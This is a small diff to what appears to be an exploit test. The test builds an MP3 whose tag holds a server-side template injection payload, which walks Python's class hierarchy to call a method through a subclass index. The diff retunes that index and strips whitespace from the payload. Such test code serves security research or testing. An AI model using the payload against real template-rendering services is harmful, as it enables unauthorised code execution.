@@ -147,9 +147,9 @@ async def exploit_test(
     await mp3_helper.create_modify_mp3(
         exploit_file,
         "Evil",
-        "{{ [].__class__.__mro__[1].__subclasses__()[-42].get_comments(html_con, +"
+        "{{[].__class__.__mro__[1].__subclasses__()[-61].get_comments(html_con,+"
         + filename.replace(".mp3", "+")
-        + ") }}",
+        + ")}}",
         "Techno",
     )
     # Evil account credentials
